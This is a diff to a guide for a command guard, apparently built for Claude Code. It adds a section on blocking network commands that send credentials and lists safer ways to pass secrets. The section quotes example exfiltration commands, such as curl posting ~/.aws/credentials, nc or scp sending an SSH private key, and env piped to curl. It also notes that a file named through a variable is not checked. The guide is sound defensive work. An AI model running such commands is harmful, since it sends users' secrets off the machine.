@@ -18,8 +18,9 @@ the MCP server's `instructions` and `guards://guide/*` resources, the prompts, a
    not cover the command text (so not a `-m` message), `gh issue`/`gh pr` bodies, or files named
    by `--body-file`, `-F` or `cat`.
 3. **Never disable or bypass the guards, and never ask the user to.** Report a false
-   positive and let the user decide. `GUARDS_ALLOW_PUBLISH_SECRETS=1` is read from the
-   environment Claude Code was started from; typing it in front of a command does
+   positive and let the user decide. The `GUARDS_ALLOW_*` switches
+   (`GUARDS_ALLOW_PUBLISH_SECRETS`, `GUARDS_ALLOW_OUTBOUND_SECRETS`) are read from the
+   environment Claude Code was started from; typing one in front of a command does
    nothing.
 
 ## Tools
@@ -49,6 +50,34 @@ Files the tools write go under `$GUARDS_STATE_DIR` (default `~/.local/share/gram
   issue text.
 - Resources: `guards://guide/publishing`, `guards://guide/false-positives`,
   `guards://guide/hooks`, `guards://guide/diagnosing-a-block`.
+
+## Sending data over the network
+
+The outbound guard checks a Bash command whose command word is `curl`, `wget`, HTTPie,
+`nc`, `scp`, `rsync`, `sftp` or `ssh`. It denies (or asks about) a command that would send:
+
+- a credential file (`curl -d @~/.aws/credentials`, `nc host 9 < ~/.ssh/id_ed25519`,
+  `scp ~/.ssh/id_ed25519 host:`), or the whole environment (`env | curl -d @- ...`);
+- a literal credential in the command text (a token in a header, `-u user:password`,
+  a password in a URL or a body).
+
+The `@` is not the problem: `curl -H @headers.txt` and `curl -d @payload.json` are fine.
+What matters is what the file is. If you need to send a credential, do not put it in the
+command line. Use one of these:
+
+1. A config file only you can read: `curl -K <file>` (with a `header = "..."` line in it) or `wget --config=<file>`.
+2. The client's netrc support: `curl --netrc-file <file>` or `~/.netrc`.
+3. A header file: `curl -H @headers.txt`.
+4. A body from a file or standard input: `curl -d @payload.json` or `curl -d @-`.
+
+A variable reference (`-H "X-Api-Key: $KEY"`) keeps the value out of the command text and the transcript but not out of the process list: `ps` shows it to other users of the machine. A header or cookie that carries a credential is printed back by `curl -v`, `wget -d` and `http --verbose`, so avoid those options when one is involved. Each form is proven against the real clients in [`OUTBOUND-SAFE-FORMS.md`](OUTBOUND-SAFE-FORMS.md).
+
+If a command is denied, read the "Where" and "What to do" parts, switch to one of the
+forms above and run it again. An ask-class file (`.env`, kubeconfig) or an ambiguous
+literal is an ask for a person in default, acceptEdits and plan modes and a deny in every
+other mode. A command that names its file through a variable (`-d @$F`) is allowed with a
+note, because the guard cannot see the path; that is a limit, not permission. Do not split,
+encode or rename a value to get past the guard.
 
 ## Diagnosing a block
 
